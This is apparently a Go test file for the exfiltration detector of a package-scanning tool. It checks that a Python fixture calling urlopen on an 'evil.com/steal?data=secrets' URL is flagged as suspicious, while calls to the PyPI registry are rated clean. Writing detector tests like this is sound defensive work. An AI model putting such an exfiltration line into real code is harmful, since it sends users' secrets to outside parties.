package builtin_test

import (
	"context"
	"testing"

	"github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
	"github.com/cloudfieldcz/shieldoo-gate/internal/scanner/builtin"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestExfilDetector_SuspiciousURL_ReturnsSuspicious(t *testing.T) {
	path := writeCodeFile(t, "steal.py",
		`import urllib.request
urllib.request.urlopen("http://evil.com/steal?data=secrets")
`)

	s := builtin.NewExfilDetector()
	result, err := s.Scan(context.Background(), scanner.Artifact{
		ID:        "evil-1.0.0",
		Ecosystem: scanner.EcosystemPyPI,
		Name:      "evil",
		Version:   "1.0.0",
		LocalPath: path,
	})

	require.NoError(t, err)
	assert.Equal(t, scanner.VerdictSuspicious, result.Verdict)
	assert.NotEmpty(t, result.Findings)
}

func TestExfilDetector_RegistryURL_ReturnsClean(t *testing.T) {
	path := writeCodeFile(t, "download.py",
		`import urllib.request
urllib.request.urlretrieve("https://pypi.org/simple/requests/")
`)

	s := builtin.NewExfilDetector()
	result, err := s.Scan(context.Background(), scanner.Artifact{
		ID:        "safe-1.0.0",
		Ecosystem: scanner.EcosystemPyPI,
		Name:      "safe",
		Version:   "1.0.0",
		LocalPath: path,
	})

	require.NoError(t, err)
	assert.Equal(t, scanner.VerdictClean, result.Verdict)
	assert.Empty(t, result.Findings)
}

func TestExfilDetector_NoURLs_ReturnsClean(t *testing.T) {
	path := writeCodeFile(t, "noop.py", `print("hello")
`)

	s := builtin.NewExfilDetector()
	result, err := s.Scan(context.Background(), scanner.Artifact{
		ID:        "noop-1.0.0",
		Ecosystem: scanner.EcosystemPyPI,
		Name:      "noop",
		Version:   "1.0.0",
		LocalPath: path,
	})

	require.NoError(t, err)
	assert.Equal(t, scanner.VerdictClean, result.Verdict)
	assert.Empty(t, result.Findings)
}

func TestExfilDetector_SupportedEcosystems_All(t *testing.T) {
	s := builtin.NewExfilDetector()
	ecosystems := s.SupportedEcosystems()
	require.Len(t, ecosystems, 4)

	ecoSet := make(map[scanner.Ecosystem]bool)
	for _, e := range ecosystems {
		ecoSet[e] = true
	}
	assert.True(t, ecoSet[scanner.EcosystemPyPI])
	assert.True(t, ecoSet[scanner.EcosystemNPM])
	assert.True(t, ecoSet[scanner.EcosystemDocker])
	assert.True(t, ecoSet[scanner.EcosystemNuGet])
}
